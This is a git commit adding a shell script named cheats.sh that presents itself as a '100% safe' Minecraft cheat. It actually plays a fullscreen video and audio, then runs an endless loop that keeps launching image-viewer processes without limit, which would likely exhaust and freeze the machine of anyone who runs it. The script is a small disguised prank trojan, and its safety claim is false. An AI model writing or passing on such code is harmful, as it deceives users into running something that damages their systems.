63558c02d713d82b621bade9d1e5d95e78479f1f
MrPerdej <antimorjat@gmail.com>
2024-12-10 21:14:11 +0300

    Add files via upload

---
+++ cheats.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+
+# cheat on minecraft
+# 100% safe
+
+function install() {
+	mpv -fs welcome.mp4 &
+	sleep 3.4
+	killall mpv 
+	mpv rusi.mp3 &
+	sleep 4
+	while true; do
+		feh potap.png & 
+	done
+}
+
+install
